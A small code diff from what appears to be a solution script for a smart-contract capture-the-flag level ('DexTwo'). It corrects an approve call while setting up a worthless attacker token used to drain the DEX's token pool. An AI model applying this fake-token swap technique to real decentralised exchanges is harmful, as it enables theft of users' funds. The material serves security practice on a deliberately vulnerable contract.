@@ -19,7 +19,7 @@ def exploit_lv23(contract: DexTwo, attacker: Account):
     attack_token = SwappableTokenTwo.deploy(contract.address, "No value token :)", "SHT1", 1000)
 
     contract.approve(contract.address, 1000)
-    attack_token.approve(attacker.address, contract.address, 1000)
+    attack_token.approve(contract.address, 1000)
     attack_token.transfer(contract.address, 100)
 
     resolver = DexTransactionResolver([t1, t2, attack_token], contract, attacker)
